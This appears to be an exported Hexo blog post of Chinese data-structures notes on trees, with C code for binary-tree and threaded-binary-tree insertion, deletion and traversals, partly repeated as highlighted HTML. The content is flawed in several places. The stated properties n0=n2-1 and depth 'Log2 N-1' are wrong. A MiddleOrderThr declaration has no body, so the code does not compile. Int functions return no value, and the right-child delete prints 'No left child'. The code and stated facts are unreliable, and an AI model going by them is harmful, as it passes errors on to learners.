if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    {\n        parent->lchild=p;\n    }\n    else\n    {\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n    }\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n}\n\nBiTree InsertTreeRightNode(BiTree T,Elemtype x,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    {\n        parent->rchild=p;\n    }\n    else\n    {\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n    }\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n}\n\nBiTree DeleteTreeLeftNode(BiTree T,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n}\n\nBiTree DeleteTreeRightNode(BiTree T,BiTree parent)\n{\n    BiTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n}\n\nint PreOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n}\n\nint MiddleOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n}\n\nint LastOrderTree(BiTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n}\n\nvoid LevelOrderTree(BiTree T)\n{\n    BiTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    {\n        return;\n    }\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    {\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->lchild;\n        }\n        if(Queue[front]->rchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->rchild;\n        }\n    }\n}\n\nvoid Visit(Elemtype data)\n{\n    printf(\"%3d\",data);\n}\n\n\nint main()\n{\n    BiTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index<numberOfNodes; index++)\n    {\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&nodedata);\n        switch(choice)\n        {\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        }\n    }\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n}\n\n\n\n\n```\n\n### 2.线索二叉树的基本操作\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiThrTreeNode\n{\n    Elemtype data;\n    struct BiThrTreeNode *lchild;\n    struct BiThrTreeNode *rchild;\n    unsigned ltag:1;\n    unsigned rtag:1;\n} BiThrTreeNode,*BiThrTree;\n\nBiThrTree pre;\n\n\nvoid Visit(Elemtype data)\n{\n    printf(\"%3d\",data);\n}\n\n\nBiThrTree CreateTree(Elemtype x)\n{\n    BiThrTree p;\n    if((p=(BiThrTree *)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n}\n\nBiThrTree InsertTreeLeftNode(BiThrTree T,Elemtype x,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    {\n        parent->lchild=p;\n        parent->ltag=0;\n    }\n    else\n    {\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n        parent->ltag=0;\n    }\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n}\n\nBiThrTree InsertTreeRightNode(BiThrTree T,Elemtype x,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL)\n    {\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    }\n    if((p=(BiThrTree*)malloc(sizeof(BiThrTreeNode)))==NULL)\n    {\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    }\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    {\n        parent->rchild=p;\n        parent->rtag=0;\n    }\n    else\n    {\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n        parent->rtag=0;\n    }\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n}\n\n\nint MiddleOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n}\n\nBiThrTree MiddleOrderThr(BiThrTree T)\n\nBiThrTree DeleteTreeLeftNode(BiThrTree T,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n}\n\nBiThrTree DeleteTreeRightNode(BiThrTree T,BiThrTree parent)\n{\n    BiThrTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    {\n        printf(\"No left child.\\n\");\n        return NULL;\n    }\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n}\n\nint PreOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n}\n\n\n\nint LastOrderTree(BiThrTree T)\n{\n    if(T==NULL)\n    {\n        return;\n    }\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n}\n\nvoid LevelOrderTree(BiThrTree T)\n{\n    BiThrTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    {\n        return;\n    }\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    {\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->lchild;\n        }\n        if(Queue[front]->rchild!=NULL)\n        {\n            Queue[++rear]=Queue[front]->rchild;\n        }\n    }\n}\n\n\n\nint main()\n{\n    BiThrTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index<numberOfNodes; index++)\n    {\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&nodedata);\n        switch(choice)\n        {\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        }\n    }\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n}\n\n\n\n\n```\n\n### 3.哈夫曼树\n\n","slug":"Ch5 树","published":1,"updated":"2021-08-25T14:22:20.000Z","_id":"clg29vyh6003jao9c2a7q3obh","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch-5-树\"><a href=\"#Ch-5-树\" class=\"headerlink\" title=\"Ch 5 树\"></a>Ch 5 树</h1><h2 id=\"一、二叉树及其性质\"><a href=\"#一、二叉树及其性质\" class=\"headerlink\" title=\"一、二叉树及其性质\"></a>一、二叉树及其性质</h2><p>（1）二叉树可以为空，但是二叉有序树至少三个节点；</p>\n<p>（2）满二叉树：2^k-1个节点、</p>\n<p>（3）非空二叉树第i层的节点数不超过2^i-1个；</p>\n<p>（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；</p>\n<p>（5）n0=n2-1;</p>\n<p>（6）n个节点的二叉树深度为Log2 N-1；</p>\n<p>（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；</p>\n<h2 id=\"二、二叉树的实现及常用操作\"><a href=\"#二、二叉树的实现及常用操作\" class=\"headerlink\" title=\"二、二叉树的实现及常用操作\"></a>二、二叉树的实现及常用操作</h2><h3 id=\"1-二叉树的基本操作\"><a href=\"#1-二叉树的基本操作\" class=\"headerlink\" title=\"1.二叉树的基本操作\"></a>1.二叉树的基本操作</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXNODE 10</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype ;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>;</span><br>&#125; BiTreeNode,*BiTree;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeParNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    Elemtype data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BiTreeParNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>,*<span class=\"hljs-title\">parent</span>;</span><br>&#125; BiParTreeNode,*BiParTree;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Initiate</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>((T=(BiTreeNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    T-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    T-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">CreateTree</span><span class=\"hljs-params\">(Elemtype x)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">InsertTreeLeftNode</span><span class=\"hljs-params\">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to leftchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">InsertTreeRightNode</span><span class=\"hljs-params\">(BiTree T,Elemtype x,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to rightchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">DeleteTreeLeftNode</span><span class=\"hljs-params\">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">DeleteTreeRightNode</span><span class=\"hljs-params\">(BiTree T,BiTree parent)</span><br>&#123;<br>    BiTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">PreOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">MiddleOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">LastOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">LevelOrderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    BiTree Queue[MAXNODE];<br>    <span class=\"hljs-type\">int</span> front,rear;<br><br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    front=<span class=\"hljs-number\">-1</span>;<br>    rear=<span class=\"hljs-number\">-1</span>;<br>    Queue[++rear]=T;<br>    <span class=\"hljs-keyword\">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;lchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;rchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">Visit</span><span class=\"hljs-params\">(Elemtype data)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%3d&quot;</span>,data);<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span 